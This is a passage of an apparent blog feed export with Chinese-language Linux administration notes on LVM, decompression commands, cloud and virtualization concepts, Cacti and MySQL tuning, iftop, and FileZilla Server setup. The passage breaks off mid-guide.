<p>根据MySQL手册，对于2G内存的机器，推荐值是20M，可适当增加。</p>
<p><strong>innodb_thread_concurrency=8</strong></p>
<p>推荐设置为 2*(NumCPUs+NumDisks)，默认一般为8</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[LVM简单配置总结]]></title>
      <url>/2013/08/03/lvm-e7-ae-80-e5-8d-95-e9-85-8d-e7-bd-ae-e6-80-bb-e7-bb-93.html</url>
      <content type="html"><![CDATA[<p>lvm  操作步骤：<br>1、找块空的硬盘 ，分区sdd1和sdd2。用t 改变system  id ，为8e，（lvm），w保持退出。</p>
<div>2、pvscan</div><br><div>3、pvcreate  /dev/sdd1   生成pv</div><br><div>4、vgcreate  vg1   /dev/sdd1  把pv（dev/sdd1）创建为一个vg1的卷组</div><br><div>5、lvcreate   －L  10M  -n  lv1  vg1   把vg1里面的10M的空间划分出来创建lv1。</div><br><div>6、格式化lv1   mkfs.ext3  /dev/vg1/lv1</div><br><div>7、挂载lv1    mount  /dev/vg1/lv1   /mnt/lv1</div><br><div>8、可以正常使用lv1</div><br><div>改变lv的大小</div><br><div>方法一：在未使用lv的时候，可以通过lvextend  扩展，需要先卸载，再扩展，再格式化，最后重新挂载。<br>lvextend  -L  +20M  /dev/vg1/lv1  增加20M<br>lvreduce  -L  -10M  /dev/vg1/lv1   减少10M</div><br><div>方法二：在已使用lv的时候，可以通过resize2fs  无损扩展，无需重新挂载，无需格式化。<br>lvresize  -L  200M  /dev/vg1/lv1<br>先设定大小为200M<br>lvresize  －L   ＋10M  /dev/vg1/lv1<br>带＋  意思是在原有基础上面增加10M<br>resize2fs  /dev/vg1/lv1<br>这条命令是执行重定义尺寸操作</div><br><div><br><br># <span style="color: #0000ff; font-size: medium;"><span style="color: #ff0000;">将逻辑卷data扩容20M,注意有+和没+的区别，有+是将逻辑卷增加了20M,没+是将逻辑卷增加到20M，区别很大</span></span><br><br></div><br><div>改变vg大小<br>通过增加pv到vg中，来增加vg的总容量<br>步骤：<br>1、pvcreate  /dev/sdd2<br>2、vgextend  vg1   /dev/sdd2</div><br><div></div><br><div></div><br><div>上面是我个人总结实验的基本步骤，现在给一张拓扑图 ，便于理解操作！</div><br><div><img src="http://img1.51cto.com/attachment/200908/200908301251618386095.jpg" alt=""></div><br><div></div><br><div></div>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[linux常见压缩格式解压缩方法总结]]></title>
      <url>/2013/07/22/linux-e5-b8-b8-e8-a7-81-e5-8e-8b-e7-bc-a9-e6-a0-bc-e5-bc-8f-e8-a7-a3-e5-8e-8b-e7-bc-a9-e6-96-b9-e6-b3-95-e6-80-bb-e7-bb-93.html</url>
      <content type="html"><![CDATA[<p>1、*.tar 用 tar –xvf 解压</p>
<p>2、*.gz 用 gzip -d或者gunzip 解压</p>
<p>3、<em>.tar.gz和</em>.tgz 用 tar –xzf 解压</p>
<p>4、*.bz2 用 bzip2 -d或者用bunzip2 解压</p>
<p>5、*.tar.bz2用tar –xjf 解压</p>
<p>6、*.Z 用 uncompress 解压</p>
<p>7、*.tar.Z 用tar –xZf 解压</p>
<p>8、*.rar 用 unrar e解压</p>
<p>9、*.zip 用 unzip 解压</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[虚拟化技术学习（二）之云计算特点及模式]]></title>
      <url>/2013/04/08/e8-99-9a-e6-8b-9f-e5-8c-96-e6-8a-80-e6-9c-af-e5-ad-a6-e4-b9-a0-ef-bc-88-e4-ba-8c-ef-bc-89-e4-b9-8b-e4-ba-91-e8-ae-a1-e7-ae-97-e7-89-b9-e7-82-b9-e5-8f-8a-e6-a8-a1-e5-bc-8f.html</url>
      <content type="html"><![CDATA[<div><br>  <div><br>    <strong>云计算的特点：</strong><br>  </div>

  <div><br>  </div>

  <div><br>    1.基于互联网络<br>  </div>

  <div><br>    2.按需服务<br>  </div>

  <div><br>    3.资源池化<br>  </div>

  <div><br>    4.高可用<br>  </div>

  <div><br>    5.资源可控<br>  </div>

  <div><br>  </div>

  <div><br>    以上从字面意思便可理解，这里不再废话！<br>  </div>

  <div><br>  </div>

  <div><br>    <strong>云计算的体系架构：</strong><br>  </div>

  <div><br>  </div>

  <div><br>    业界通常认为云计算体系分为3个层次，即：<br>  </div>

  <div><br>    Iaas      Infrastructure as a Service  基础设施即是服务<br>  </div>

  <div><br>    Paas     Platform as a  Service  平台即服务<br>  </div>

  <div><br>    Saas     Software as a Service  软件即服务<br>  </div>

  <div><br>  </div>

  <div><br>    以上三层对用户来讲是相互独立的，因为每层提供的服务各不相同，从技术角度讲是相互依赖的，但不相互依存<br>  </div><br></div>

<div><br>  <span style="font-size: medium;"> </span><br></div>

<div><br>  <span style="font-size: medium;"> <a href="http://www.simlinux.com/old/wp-content/uploads/2013/04/clipboard.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/04/clipboard.png" alt="clipboard"></a></span><br></div>

<div><br>  <img src="file:///C:/Users/geekwolf/AppData/Local/youdao/ynote/images/0471BA417352490DB29FA91A3CCB0B9E/clipboard.png" alt=""><br></div>

<div><br>  <span style="font-size: medium;"> </span><br></div>

<div><br>  <div><br>    若此图还不能帮助理解，请百度吧！<br>  </div>

  <div><br>  </div>

  <div><br>    <strong> </strong><br>  </div>

  <div><br>    <strong>云计算的模式：</strong><br>  </div>

  <div><br>    <strong> </strong><br>  </div>

  <div><br>    1.公有云<br>  </div>

  <div><br>      通常是指第三方提供商为用户提供的能够使用的云，或者企业通过自己的基础设施直接向外部用户提供服务的云。<br>  </div>

  <div><br>    例子：微软的Windows  Azrue、Google的Apps、Amazon的AWS；<br>  </div>

  <div><br>      特点：费用较低，灵活性高，可大规模应用等优点<br>  </div>

  <div><br>  </div>

  <div><br>    2.私有云<br>  </div>

  <div><br>      通常是指用户自己开发或者使用云计算产品自己搭建（也可由云提供商进行构建）云计算环境并只为自己提供服务的云计算；是为单独使用而构建的，因而可提供对数据、安全性和服务质量的最有效控制<br>  </div>

  <div><br>      特点：具有数据安全性高、能充分利用资源、服务质量高等有点<br>  </div>

  <div><br>  </div>

  <div><br>    3.混合云<br>  </div>

  <div><br>      对于信息控制、可扩展性、突发需求以及故障转移需求来说，只有将公有云和私有云相结合才可满足，这种两者结合起来的云就是混合云。<br>  </div>

  <div><br>     特点：用户可以享受接近私有云的私密性和接近公有云的成本，并且能快速地介入大量位于公有云的计算能力<br>  </div>

  <div><br>  </div>

  <div><br>    4.行业云<br>  </div>

  <div><br>        是由国内著名的商用IT解决方案提供商浪潮提出的。行业云就是由行业内或某个区域内起主导作用或者掌握关键资源的组织建立和维护，以公开或者半公开的方式，向行业内部或相关组织和公众提供有偿或无偿服务的云平台。目前浪潮已将其定义为浪潮云计算业务的战略市场。<br>  </div>

  <div><br>  </div>

  <div><br>       笔记种提到的云概念的定义部分来自百度百科，但内容完全摘抄马博峰《VMware、Citrix和Microsoft虚拟化技术详解与应用实践》，<strong><span style="color: #ff0000;">学习总会在不断总结和推敲中进步！</span></strong>希望能和各位Geek一起探讨！<br>  </div>

  <div><br>  </div>

  <div><br>    上一篇<br>  </div>

  <div><br>    <a href="http://www.simlinux.com/old/?p=1015">虚拟化技术学习（一）之虚拟化与云计算概念</a><br>  </div>

  <div><br>    <a href="http://www.simlinux.com/old/?p=1015">http://www.simlinux.com/old/?p=1015</a><br>  </div><br></div>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Cacti的优化]]></title>
      <url>/2013/04/02/cacti-e7-9a-84-e4-bc-98-e5-8c-96.html</url>
      <content type="html"><![CDATA[<p>1，<strong>优化数据库schema，建立合理的索引</strong></p>
<p>cacti默认的cacti.sql建立的数据库模型，竟然一个Index都没有建。每次执行poller.php的时候，主要的时间，都花费在<strong>数据库</strong>查询上。使用下面的sql语句，建立一系列索引，弥补默认的<strong>cacti</strong>.sql中缺乏index的缺点。可以有效的提高poller.php执行的效率，缩短更新RRD文件所需的时间</p>
<p>CREATE INDEX <code>data_template_data_id</code> ON <code>data_input_data</code> (<code>data_template_data_id</code>);</p>
<p>CREATE INDEX <code>host_id_snmp_query_id_snmp_index</code> ON data_local (<code>host_id</code>,<code>snmp_query_id</code>,<code>snmp_index</code>);</p>
<p>CREATE INDEX <code>local_data_id_data_source_name</code> ON data_template_rrd (<code>local_data_id</code>,<code>data_source_name</code>);</p>
<p>CREATE INDEX <code>graph_template_id_local_graph_id</code> ON graph_templates_item (<code>graph_template_id</code>,<code>local_graph_id</code>);<br>CREATE INDEX <code>local_graph_template_item_id</code> ON graph_templates_item (<code>local_graph_template_item_id</code>);</p>
<p>CREATE INDEX <code>host_id_snmp_query_id_snmp_index</code> ON host_snmp_cache (<code>host_id</code>,<code>snmp_query_id</code>,<code>snmp_index</code>);</p>
<p>CREATE INDEX <code>local_data_id_rrd_path</code> ON poller_item (<code>local_data_id</code>,<code>rrd_path</code>);<br>CREATE INDEX <code>host_id_rrd_next_step</code> ON poller_item (<code>host_id</code>,<code>rrd_next_step</code>);</p>
<p>CREATE INDEX host_id_snmp_query_id ON host_snmp_cache (host_id,snmp_query_id);</p>
<p>CREATE INDEX host_id_snmp_port ON poller_item (host_id,snmp_port);</p>
<p>CREATE INDEX data_source_path ON data_template_data (data_source_path);</p>
<p>show index from table； 查看索引</p>
<p><strong>2, 重构rra文件的目录结构，为每个device建立单独的rra目录</strong></p>
<p>首先在crontab里禁用poller.php，然后执行cacti_install_dir/cli目录下的 structure_rra_paths.php，</p>
<p>php  structure_rra_paths.php –proceed</p>
<p>它会将所有的RRD文件按照device重新分配目录，并修改<strong>数据库</strong>中的RRD路径，成功执行后，再恢复poller.php的crontab就可以了。</p>
<p>按照上面3个步骤，710台服务器，24000个RRD文件，完成一次poller.php的时间，缩短到50 seconds。实现了最初的目的。</p>
<p>TODO:</p>
<p>在执行poller.php的时候, <strong>监控</strong>服务器的load达到了3，通过vmstat查看，显示负载主要在I/O。在目前的情况，如果再出现瓶颈，可以考虑安装Boost插件来进一步提供性能。</p>
<p>cacti主要通过snmp来采集数据，可以引入collected等客户端，提供数据采集的可靠性。</p>
<p><strong>3</strong>，<strong>使用spine替代默认的cmd.php来采集数据 见上一章</strong></p>
<p><strong>1、让Cacti使用Spine插件，并进行相关设置</strong><br>关于spine插件的安装，这里就不讲了<br>访问：<a href="http://cacti_host_ipaddress/cacti" target="_blank" rel="external">http://cacti_host_ipaddress/cacti</a><br>Settings -&gt; Paths -&gt; “Spine Poller File Path” -&gt; spine程序的位置<br>Settings -&gt; Poller -&gt; “Poller Type” -&gt; spine</p>
<p><strong>2、进程调整</strong></p>
<p>对于进程和线程的调整有利于缩短采集时间，可以进行大量的采集。在CU论坛上看有人说cacti能够同时采集1k服务，这样的性能没有测试过，但是有人测试过同时采集200台服务器的，占用的内容只有几百兆，cpu的利用率也很低，说明一台的普通的机器排除网络链路延时采集的性能是相当强悍的</p>
<p>Settings -&gt; Poller -&gt; “Maximum Concurrent Poller Processes”（最大并发轮询器进程），修改该值<br>Settings -&gt; Poller -&gt; “Maximum Threads per Process”（每进程最大线程数），修改该值<br>Settings -&gt; Poller -&gt; “Number of PHP Script Servers”（PHP脚本服务程序数），修改该值<br>通过修改这三个参数，可以提高一部分的性能</p>
<p><strong>3、增加php 的内存使用的上限值</strong></p>
<h1 id="vi-etc-php-ini"><a href="#vi-etc-php-ini" class="headerlink" title="vi /etc/php.ini"></a>vi /etc/php.ini</h1><p>memory_limit = 256M （预设是128MB，根据内存的使用情况，可以改大一点）</p>
<p><strong>4、定期 optimize cacti 数据库</strong><br>cacti 的 poller_output 会不明原因的长大，大到数据越写越慢，直到无法更新。每隔一段时间手动 “Truncate poller_output table” 后，就会继续正常运作；所以我们可以利用crontab定期清除数据</p>
<p>#vi /etc/cron.d/truncate_poller<br>0 0 <em> </em> 0  root  /usr/local/mysql/bin/mysql –user=cacti –password=2010 cacti -e ‘truncate table poller_output;’</p>
<p>#chkconfig –level 3 crond on &amp;&amp; service crond start<br><strong><br>5、修改mysql的最大连接数</strong><br>一般默认安装的时候没有调整最大连接数的话，当需要并发量的时候可以出图就会断断续续的<br>mysql&gt; set GLOBAL max_connections=2000；<br>或者直接修改my.cnf配置文件，增加：max_connections = 2000；</p>
<p>&nbsp;</p>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux流量监控工具iftop]]></title>
      <url>/2013/03/31/linux-e6-b5-81-e9-87-8f-e7-9b-91-e6-8e-a7-e5-b7-a5-e5-85-b7iftop.html</url>
      <content type="html"><![CDATA[<p>在类Unix系统中可以使用top查看系统资源、进程、内存占用等信息。查看网络状态可以使用netstat、nmap等工具。若要查看实时的网络流量，监控TCP/IP连接等，则可以使用<a href="http://www.vpser.net/manage/iftop.html" target="_blank" rel="external">iftop</a>。</p>
<h2 id="一、iftop是什么？"><a href="#一、iftop是什么？" class="headerlink" title="一、iftop是什么？"></a>一、iftop是什么？</h2><p><a href="http://www.vpser.net/manage/iftop.html" target="_blank" rel="external">iftop</a>是类似于top的实时流量监控工具。</p>
<p>官方网站：<a href="http://www.ex-parrot.com/~pdw/iftop/" target="_blank" rel="external">http://www.ex-parrot.com/~pdw/iftop/</a></p>
<h2 id="二、iftop有什么用？"><a href="#二、iftop有什么用？" class="headerlink" title="二、iftop有什么用？"></a>二、iftop有什么用？</h2><p><a href="http://www.vpser.net/manage/iftop.html" target="_blank" rel="external">iftop</a>可以用来监控网卡的实时流量（可以指定网段）、反向解析IP、显示端口信息等，详细的将会在后面的使用参数中说明。<img src="http://www.vpser.net/wp-includes/js/tinymce/plugins/wordpress/img/trans.gif" alt="" title="更多..."></p>
<h2 id="三、安装iftop"><a href="#三、安装iftop" class="headerlink" title="三、安装iftop"></a>三、安装iftop</h2><h3 id="安装方法1、编译安装"><a href="#安装方法1、编译安装" class="headerlink" title="安装方法1、编译安装"></a><strong>安装方法1、</strong>编译安装</h3><p>如果采用编译安装可以到<a href="http://www.ex-parrot.com/~pdw/iftop/" target="_blank" rel="external">iftop官网</a>下载最新的源码包。</p>
<p>安装前需要已经安装好基本的编译所需的环境，比如make、gcc、autoconf等。安装iftop还需要安装libpcap和libcurses。</p>
<p><strong>CentOS上安装所需依赖包：</strong></p>
<p>yum install flex byacc  libpcap ncurses ncurses-devel</p>
<p><strong>Debian上安装所需依赖包：</strong></p>
<p>apt-get install flex byacc  libpcap0.8 libncurses5</p>
<p>下载iftop</p>
<blockquote>
<p>wget <a href="http://www.ex-parrot.com/pdw/iftop/download/iftop-0.17.tar.gz" target="_blank" rel="external">http://www.ex-parrot.com/pdw/iftop/download/iftop-0.17.tar.gz</a></p>
<p>tar zxvf iftop-0.17.tar.gz</p>
<p>cd iftop-0.17</p>
<p>./configure</p>
<p>make &amp;&amp; make install</p>
</blockquote>
<h3 id="安装方法2：-懒人办法，最简单"><a href="#安装方法2：-懒人办法，最简单" class="headerlink" title="安装方法2：(懒人办法，最简单)"></a>安装方法2：(懒人办法，最简单)</h3><p>直接省略上面的步骤</p>
<p>CentOS系统运行：yum install iftop</p>
<p>Debian系统 运行：apt-get install iftop</p>
<h2 id="四、运行iftop"><a href="#四、运行iftop" class="headerlink" title="四、运行iftop"></a>四、运行iftop</h2><p>直接运行： iftop</p>
<p>效果如下图：</p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/03/iftop-interface.jpg"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/iftop-interface.jpg" alt="iftop-interface"></a></p>
<h2 id="五、相关参数及说明"><a href="#五、相关参数及说明" class="headerlink" title="五、相关参数及说明"></a>五、相关参数及说明</h2><h3 id="1、iftop界面相关说明"><a href="#1、iftop界面相关说明" class="headerlink" title="1、iftop界面相关说明"></a>1、iftop界面相关说明</h3><p>界面上面显示的是类似刻度尺的刻度范围，为显示流量图形的长条作标尺用的。</p>
<p>中间的&lt;= =&gt;这两个左右箭头，表示的是流量的方向。</p>
<p>TX：发送流量<br>RX：接收流量<br>TOTAL：总流量<br>Cumm：运行iftop到目前时间的总流量<br>peak：流量峰值<br>rates：分别表示过去 2s 10s 40s 的平均流量</p>
<h3 id="2、iftop相关参数"><a href="#2、iftop相关参数" class="headerlink" title="2、iftop相关参数"></a>2、iftop相关参数</h3><h3 id="常用的参数"><a href="#常用的参数" class="headerlink" title="常用的参数"></a>常用的参数</h3><p>-i设定监测的网卡，如：# iftop -i eth1</p>
<p>-B 以bytes为单位显示流量(默认是bits)，如：# iftop -B</p>
<p>-n使host信息默认直接都显示IP，如：# iftop -n</p>
<p>-N使端口信息默认直接都显示端口号，如: # iftop -N</p>
<p>-F显示特定网段的进出流量，如# iftop -F 10.10.1.0/24或# iftop -F 10.10.1.0/255.255.255.0</p>
<p>-h（display this message），帮助，显示参数信息</p>
<p>-p使用这个参数后，中间的列表显示的本地主机信息，出现了本机以外的IP信息;</p>
<p>-b使流量图形条默认就显示;</p>
<p>-f这个暂时还不太会用，过滤计算包用的;</p>
<p>-P使host信息及端口信息默认就都显示;</p>
<p>-m设置界面最上边的刻度的最大值，刻度分五个大段显示，例：# iftop -m 100M</p>
<h3 id="进入iftop画面后的一些操作命令-注意大小写"><a href="#进入iftop画面后的一些操作命令-注意大小写" class="headerlink" title="进入iftop画面后的一些操作命令(注意大小写)"></a>进入iftop画面后的一些操作命令(注意大小写)</h3><p>按h切换是否显示帮助;</p>
<p>按n切换显示本机的IP或主机名;</p>
<p>按s切换是否显示本机的host信息;</p>
<p>按d切换是否显示远端目标主机的host信息;</p>
<p>按t切换显示格式为2行/1行/只显示发送流量/只显示接收流量;</p>
<p>按N切换显示端口号或端口服务名称;</p>
<p>按S切换是否显示本机的端口信息;</p>
<p>按D切换是否显示远端目标主机的端口信息;</p>
<p>按p切换是否显示端口信息;</p>
<p>按P切换暂停/继续显示;</p>
<p>按b切换是否显示平均流量图形条;</p>
<p>按B切换计算2秒或10秒或40秒内的平均流量;</p>
<p>按T切换是否显示每个连接的总流量;</p>
<p>按l打开屏幕过滤功能，输入要过滤的字符，比如ip,按回车后，屏幕就只显示这个IP相关的流量信息;</p>
<p>按L切换显示画面上边的刻度;刻度不同，流量图形条会有变化;</p>
<p>按j或按k可以向上或向下滚动屏幕显示的连接记录;</p>
<p>按1或2或3可以根据右侧显示的三列流量数据进行排序;</p>
<p>按&lt;根据左边的本机名或IP排序;</p>
<p>按&gt;根据远端目标主机的主机名或IP排序;</p>
<p>按o切换是否固定只显示当前的连接;</p>
<p>按f可以编辑过滤代码，这是翻译过来的说法，我还没用过这个！</p>
<p>按!可以使用shell命令，这个没用过！没搞明白啥命令在这好用呢！</p>
<p>按q退出监控。</p>
<h2 id="六、常见问题"><a href="#六、常见问题" class="headerlink" title="六、常见问题"></a>六、常见问题</h2><p>1、make: yacc: Command not found<br>make: <em>*</em> [grammar.c] Error 127</p>
<p>解决方法：apt-get install byacc   /   yum install byacc</p>
<p>2、configure: error: Curses! Foiled again!<br>(Can’t find a curses library supporting mvchgat.)<br>Consider installing ncurses.</p>
<p>解决方法：apt-get install libncurses5-dev  /    yum  install ncurses-devel</p>
<p>转载收藏</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[虚拟化技术学习（一）之虚拟化与云计算概念]]></title>
      <url>/2013/03/30/e8-99-9a-e6-8b-9f-e5-8c-96-e4-b8-8e-e4-ba-91-e8-ae-a1-e7-ae-97-e6-a6-82-e5-bf-b5.html</url>
      <content type="html"><![CDATA[<p><strong>背景：</strong>基于 马博峰《VMWARE CITRIX和Microsoft 虚拟化技术详解与应用实战》，整理的笔记，此笔记有些参考了互联网上的资料，和书上部分内容有差别！此后将继续把我的学习笔记共享出来，没两天或者三天发一篇！希望能和大家一起交流学习！</p>
<p><strong><span style="font-size: medium;">虚拟化目的：</span></strong></p>
<div><span style="font-family: 'Microsoft Yahei';">1.在一个特定的软硬件环境中去虚拟另一个不同的软硬件环境，打破层级依赖的现状</span></div><br><div><span style="font-family: 'Microsoft Yahei';">2.提高计算机设备的利用率<br></span></div><br><div><span style="font-family: 'Microsoft Yahei';">3.不同的物理机器之间会存在兼容性问题<br></span></div><br><div><span style="font-family: 'Microsoft Yahei';">4.节约成本</span></div><br><strong><span style="font-family: 'Microsoft Yahei'; font-size: medium;">虚拟化的分类：</span></strong><br><div>1.平台虚拟化（Platform V irtualization）</div><br><div><span style="font-family: 'Microsoft Yahei';">针对服务器和操作系统的虚拟化，主要包括服务器虚拟化和桌面虚拟化</span></div><br><div><span style="font-family: 'Microsoft Yahei';">服务器虚拟化是将一个操作系统的物理实例分割到虚拟实例或者虚拟机中，分为软件虚拟化和硬件虚拟化<br></span></div><br><div><span style="font-family: 'Microsoft Yahei';">软件虚拟化指一个虚拟化平台上运行虚拟化操作系统，而这个虚拟化平台运行在现有的操作系统上，属于寄居架构</span></div><br><div><span style="font-family: 'Microsoft Yahei';">硬件虚拟化指虚拟化平台直接运行在物理硬件上；这个虚拟层（Virtualization layer）平台称为Hypervisior</span></div><br><div><span style="font-family: 'Microsoft Yahei';">  </span></div><br><div> <a href="http://www.simlinux.com/old/wp-content/uploads/2013/03/clipboard.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/clipboard.png" alt="clipboard"></a></div><br><div></div><br><div>                                                                                                  <a href="file:///C:/Documents%20and%20Settings/Administrator/Local%20Settings/Application%20Data/youdao/ynote/editor/web/&amp;nbsp;http://en.wikipedia.org/wiki/Hypervisor" target="_blank" rel="external"> http://en.wikipedia.org/wiki/Hypervisor</a></div><br><div></div><br><div>2.资源虚拟化（Resource Virtualization）</div><br><div>主要是虚拟计算机中使用的资源，包括存储虚拟化和网络虚拟化</div><br><div> 存储虚拟化是对存储硬件资源进行抽象化表现，用于合并多个设备中的物理存储，使其表现为一个单一的存储池</div><br><div></div><br><div><a href="http://www.simlinux.com/old/wp-content/uploads/2013/03/1618152.jpeg"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/1618152.jpeg" alt="1618152"></a></div><br><div></div><br><div>网络虚拟化       比如：VLAN</div><br><div></div><br><div>3.用程序虚拟化（Application Virtualization）</div><br><div>基于软件的服务虚拟化是将应用程序从操作系统中分离出来，使应用程序运行在操作系统中，但是又不依赖于操作系统。</div><br><div></div><br><div>4.表示层虚拟化（Present Virtualization）</div><br><div>用户在使用应用程序时，其应用程序并不是运行在本地操作系统之上，而是运行在服务器上面的，客户机只显示成胥的界面和用户的操作，服务器仅向用户提供表示层，这种虚拟化就是表示层虚拟化</div><br><div></div><br><div><strong>实例：</strong></div><br><div></div><br><div><a href="http://www.simlinux.com/old/wp-content/uploads/2013/03/2.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/2.png" alt="2"></a></div><br><div></div><br><div>下一篇</div><br><div><a href="http://www.simlinux.com/old/?p=1101">虚拟化技术学习（二）之云计算特点及模式</a></div><br><div><a href="http://www.simlinux.com/old/?p=1101">http://www.simlinux.com/old/?p=1101</a></div>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Citrix </tag>
            
            <tag> vmware </tag>
            
            <tag> 虚拟化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[FileZilla Server 安装及使用]]></title>
      <url>/2013/03/20/filezilla-server-e5-ae-89-e8-a3-85-e5-8f-8a-e4-bd-bf-e7-94-a8-2.html</url>
      <content type="html"><![CDATA[<p>一．安装过程</p>
<p>1.打开FileZilla Server的exe文件，选择下一步：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-13233.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image3040.png" alt="wps_clip_image-3040" title="wps_clip_image-3040"></a></p>
<p>2.选择同意条款，点击下一步：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-15135.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image12198.png" alt="wps_clip_image-12198" title="wps_clip_image-12198"></a></p>
<p>3. FileZilla Server的软件信息介绍，选择下一步：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-23683.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image9759.png" alt="wps_clip_image-9759" title="wps_clip_image-9759"></a></p>
<p>4.选择FileZilla Server的安装路径，选择下一步：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-13755.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image18437.png" alt="wps_clip_image-18437" title="wps_clip_image-18437"></a></p>
<p>5.选择需要安装的程序组件，一般我们保持默认，选择下一步：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-1173.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image4692.png" alt="wps_clip_image-4692" title="wps_clip_image-4692"></a></p>
<p>6.选择FileZilla Server的启动方式：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-4212.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image9106.png" alt="wps_clip_image-9106" title="wps_clip_image-9106"></a></p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-11202.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image24268.png" alt="wps_clip_image-24268" title="wps_clip_image-24268"></a></p>
<p>7.全部勾掉，不进行安装：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-25736.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image25070.png" alt="wps_clip_image-25070" title="wps_clip_image-25070"></a></p>
<p>8.准备开始安装：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-19430.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image29955.png" alt="wps_clip_image-29955" title="wps_clip_image-29955"></a></p>
<p>9.安装完成：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-14566.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image30087.png" alt="wps_clip_image-30087" title="wps_clip_image-30087"></a></p>
<p>10.安装完成后，出现下面的界面，保持默认即可：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-15594.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image22820.png" alt="wps_clip_image-22820" title="wps_clip_image-22820"></a></p>
<p>11. FileZilla Server的状态模式界面：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-16514.png" target="_blank" rel="external"></a></p>
<p>二．FileZilla Server的简单使用</p>
<p>1.点击红色标记部分的头像图表，开始添加用户：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-29891.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image1918.png" alt="wps_clip_image-1918" title="wps_clip_image-1918"></a></p>
<p>2.添加用户的界面，选择红色标记部分的添加按钮：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-4377.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image5837.png" alt="wps_clip_image-5837" title="wps_clip_image-5837"></a></p>
<p>3.添加用户账户，添加完成后，选择确定：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-28220.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image26617.png" alt="wps_clip_image-26617" title="wps_clip_image-26617"></a></p>
<p>4.用户添加完成后，勾选红色标记部分的密码选项，输入密码：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-26638.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image19617.png" alt="wps_clip_image-19617" title="wps_clip_image-19617"></a></p>
<p>5.选择左边红色标记部分中的共享文件夹，点击添加按钮：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-4048.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image21971.png" alt="wps_clip_image-21971" title="wps_clip_image-21971"></a></p>
<p>6.选择您所需要的FTP主目录，红色标记部分是新建的FTP用户对该FTP主目录及其文件的权限设置：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-15892.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image5547.png" alt="wps_clip_image-5547" title="wps_clip_image-5547"></a></p>
<p>7.在速度限制选项中，可以对FTP用户的下载和上传速度进行限制：</p>
<p><a href="http://www.idc945.com/wp-content/uploads/2012/11/wps_clip_image-21276.png" target="_blank" rel="external"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/03/wps_clip_image268.png" alt="wps_clip_image-268" title="wps_clip_image-268"></a></p>
<p>8.在IP过滤选项中，可以限制IP连接该FTP服务器：</p>
